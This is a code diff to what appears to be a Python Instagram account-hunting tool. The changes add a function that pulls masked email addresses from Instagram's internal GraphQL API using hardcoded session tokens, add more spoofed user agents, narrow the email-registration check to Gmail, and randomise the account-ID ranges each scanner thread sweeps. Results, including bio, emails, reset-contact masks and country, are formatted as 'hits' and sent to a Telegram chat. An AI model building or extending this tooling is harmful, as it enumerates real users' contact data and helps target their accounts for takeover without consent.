@@ -153,6 +153,8 @@ _m1_scanned      = 0
 _m1_found_emails = []
 _m1_found_lock   = Lock()
 _m1_hit_lock     = Lock()
+_m1_pool:        ThreadPoolExecutor = None
+_m1_lookup_pool: ThreadPoolExecutor = None
 
 _web_state = {
     'running': False, 'method': None,
@@ -189,6 +191,11 @@ _M1_USER_AGENTS = [
     "Instagram 321.0.0.28.120 Android (33/13; 420dpi; 1080x2400; realme; RMX3710; halo; mt6833; en_GB; 469862234)",
     "Instagram 370.1.0.43.96 Android (34/14; 450dpi; 1080x2207; samsung; SM-A235F; a23; qcom; en_IN; 704872281)",
     "Instagram 368.0.0.45.96 Android (30/11; 440dpi; 1080x2220; Xiaomi/Redmi; 23127PN0CC; begonia; mt6785; ar_EG; 700073482)",
+    "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Mobile Safari/537.36",
+    "Mozilla/5.0 (Linux; Android 13; SM-A546B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Mobile Safari/537.36",
+    "Mozilla/5.0 (Linux; Android 14; Pixel 8) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Mobile Safari/537.36",
+    "Mozilla/5.0 (iPhone; CPU iPhone OS 17_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Mobile/15E148 Safari/604.1",
+    "Mozilla/5.0 (Linux; Android 12; SM-G991B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Mobile Safari/537.36",
 ]
 
 _M1_WEB_USER_AGENTS = [
@@ -410,9 +417,7 @@ def _m1_rest_web_check_email(email):
                 }
             )
             data = response.json()
-            # available: False  → email IS registered on Instagram (hit)
-            # available: True   → email is free, not tied to any account (miss)
-            return data.get("available") is False
+            return data.get("allow_shared_email_registration") is True
     except Exception:
         return False
 
@@ -584,6 +589,59 @@ def _m1_rest_v1(username):
                 continue
             return "-"
     return "-"
+
+
+# ── Masked email fetch ──
+
+def _m1_get_masked(username):
+    """Fetch the masked email for a username via Instagram GraphQL."""
+    url = "https://www.instagram.com/api/graphql"
+    lsd = ''.join(random.choices('azertyuiopmlkjhgfdsqwxcvbnAZERTYUIOPMLKJHGFDSQWXCVBN1234567890', k=16))
+    payload = {
+        'av': "17841415868335107",
+        '__d': "www", '__user': "0", '__a': "1", '__req': "1",
+        '__hs': "20629.HYP:instagram_web_pkg.2.1...0",
+        'dpr': "2", '__ccg': "EXCELLENT", '__rev': "1042081373",
+        '__s': "4zlig1:6bh2wg:8z2xip", '__hsi': "7655152724444622381",
+        '__comet_req': "7",
+        'fb_dtsg': "NAfwHWr-4eRuG0p4E_PSCsCtnluTDdF08efRYHaoW-CR8dQeGFYT6Sw:17865068956001195:1782354002",
+        'jazoest': "26134", 'lsd': lsd,
+        '__spin_r': "1042081373", '__spin_b': "trunk", '__spin_t': "1782354136",
+        'fb_api_caller_class': "RelayModern",
+        'fb_api_req_friendly_name': "CAAIGAccountSearchViewQuery",
+        'server_timestamps': "true",
+        'variables': (
+            '{"enable_integrity_filters":true,"id":"25025320",'
+            '"__relay_internal__pv__PolarisCannesGuardianExperienceEnabledrelayprovider":true,'
+            '"__relay_internal__pv__PolarisCASB976ProfileEnabledrelayprovider":false,'
+            '"__relay_internal__pv__PolarisWebSchoolsEnabledrelayprovider":false,'
+            '"__relay_internal__pv__PolarisRepostsConsumptionEnabledrelayprovider":false}'
+        ),
+        'doc_id': "26672929172408668",
+    }
+    headers = {
+        'User-Agent': "Mozilla/5.0 (Linux; Android 15; Pixel 9) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/149.0.0.0 Mobile Safari/537.36",
+        'accept': '*/*', 'accept-language': 'en-US,en;q=0.9',
+        'content-type': 'application/x-www-form-urlencoded',
+        'origin': 'https://www.instagram.com',
+        'referer': 'https://www.instagram.com/instagram/',
+        'x-fb-lsd': lsd,
+        'x-ig-app-id': '1217981644879628',
+    }
+    try:
+        response = requests.post(url, data=payload, headers=headers, timeout=20)
+        contact_points = (
+            response.json()
+            .get("data", {})
+            .get("caa_ar_ig_account_search", {})
+            .get("contact_points", [])
+        )
+        return next(
+            (i["contact_point"] for i in contact_points if i.get("type") == "EMAIL"),
+            None
+        )
+    except Exception:
+        return None
 
 
 # ── Google / Gmail token helpers ──
@@ -945,6 +1003,7 @@ def _m1_save_hit(username, domain, user, token, chat_id):
     meta       = "True" if posts > 2 else "False"
 
     reset_mask = _m1_rest_v1(username)
+    masked     = _m1_get_masked(username)
 
     about          = _m1_get_about_account(user_id, username)
     join_date      = about.get("join_date") or year
@@ -957,6 +1016,8 @@ def _m1_save_hit(username, domain, user, token, chat_id):
         _m1_hits  += 1
         _m1_total += 1
         hit_num    = _m1_hits
+
+    masked_line = f"[ ✰ ] Masked Email ➺ {masked}\n" if masked else ""
 
     box = (
         "\n"
@@ -977,6 +1038,7 @@ def _m1_save_hit(username, domain, user, token, chat_id):
         f"[ ✰ ] Bio          ➺ {bio}\n"
         f"[ ✰ ] Email        ➺ {email_str}\n"
         f"[ ✰ ] Attached     ➺ {reset_mask}\n"
+        f"{masked_line}"
         f"[ ✰ ] Year         ➺ {year}\n"
         f"[ ✰ ] Join Date    ➺ {join_date}\n"
         f"[ ✰ ] Country      ➺ {country_display}\n"
@@ -1000,43 +1062,16 @@ def _m1_save_hit(username, domain, user, token, chat_id):
 
 # ── Core scanner ──
 
-_m1_lookup_pool: ThreadPoolExecutor = None
-
-_M1_MULTI_DOMAINS = [
-    ("gmail.com", "gmail"),
-    ("aol.com",   "yahoo"),
-]
-
 def _m1_cinstagram(username, user, token, chat_id, loc_session):
     global _m1_good_insta, _m1_bad_insta
 
-    def _check_domain(domain, provider):
-        email = f"{username}@{domain}"
-        if not _m1_lookup_instagram(email):
-            return False
-        if provider == "gmail":
-            _m1_cgmail(username, user, token, chat_id, requests.Session())
-        elif provider == "yahoo":
-            _m1_cyahoo(username, domain, user, token, chat_id)
-        return True
-
-    found_any = False
-    with ThreadPoolExecutor(max_workers=2) as domain_pool:
-        futures_map = {
-            domain_pool.submit(_check_domain, domain, provider): domain
-            for domain, provider in _M1_MULTI_DOMAINS
-        }
-        for fut in as_completed(futures_map):
-            try:
-                if fut.result():
-                    found_any = True
-            except Exception:
-                pass
-
-    if found_any:
+    email = f"{username}@gmail.com"
+    if _m1_lookup_instagram(email):
         _m1_good_insta += 1
+        _m1_cgmail(username, user, token, chat_id, requests.Session())
     else:
         _m1_bad_insta += 1
+
 
 def _m1_sinsta(min_id, max_id, token, chat_id, min_followers=0, stop_event=None):
     local_session = _register_session(requests.Session())
@@ -1134,11 +1169,6 @@ def run_method1_web(token, chat_id, year_choice, min_followers, stop_event):
         "recent_hits": [], "tg_status": "", "tg_error": "",
     })
 
-    if year_choice is not None:
-        min_id, max_id = get_year_range(year_choice)
-    else:
-        min_id, max_id = 1, 78313496938
-
     _m1_next_about_session()
     _m1_about_refresh_tokens(_m1_ABOUT_COOKIE_STR)
     Thread(target=_m1_about_token_refresher, daemon=True).start()
@@ -1155,8 +1185,16 @@ def run_method1_web(token, chat_id, year_choice, min_followers, stop_event):
         scanner_pool    = ThreadPoolExecutor(max_workers=NUM_SCANNERS)
         _m1_lookup_pool = lookup_pool
         _m1_pool        = scanner_pool
+
+        def _worker_range():
+            """Each worker gets its own random year range (or fixed if user chose one)."""
+            if year_choice is not None:
+                return get_year_range(year_choice)
+            r = random.choice(WORKING_RANGES)
+            return r[0], r[1]
+
         futures = [
-            scanner_pool.submit(_m1_sinsta, min_id, max_id, token, chat_id, min_followers, stop_event)
+            scanner_pool.submit(_m1_sinsta, *_worker_range(), token, chat_id, min_followers, stop_event)
             for _ in range(NUM_SCANNERS)
         ]
         for future in as_completed(futures):
